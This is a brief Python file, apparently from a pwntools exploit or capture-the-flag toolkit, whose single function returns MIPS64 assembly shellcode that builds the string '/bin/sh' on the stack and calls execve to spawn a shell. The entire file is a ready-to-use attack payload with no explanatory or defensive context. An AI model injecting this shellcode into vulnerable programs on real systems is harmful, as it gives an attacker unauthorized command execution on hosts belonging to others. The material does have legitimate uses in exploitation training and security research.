from pwn import *
def sh():
	shellcode_execve='''
	/* execve(path='/bin/sh', argv=['sh'], envp=0) */
	lui     $t1, 0x6e69
	ori     $t1, $t1, 0x622f
	sw      $t1, -8($sp)
	lui     $t9, 0xff97
	ori     $t9, $t9, 0x8cd0
	nor     $t1, $t9, $zero
	sw      $t1, -4($sp)
	daddiu   $sp, $sp, -8
	dadd     $a0, $sp, $zero
	lui     $t1, 0x6e69
	ori     $t1, $t1, 0x622f
	sw      $t1,-12($sp)
	lui     $t9, 0xff97
	ori     $t9, $t9, 0x8cd0
	nor     $t1, $t9, $zero
	sw      $t1, -8($sp)
	sw      $zero, -4($sp)
	daddiu   $sp, $sp, -12
	slti    $a1, $zero, -1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	li      $t9, -9
	nor     $a1, $t9, $zero
	dadd     $a1, $sp, $a1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	dadd     $a1, $sp, $zero
	slti    $a2, $zero, -1
	li      $v0, 0x13c1
	syscall 0x40404
	'''
	return shellcode_execve
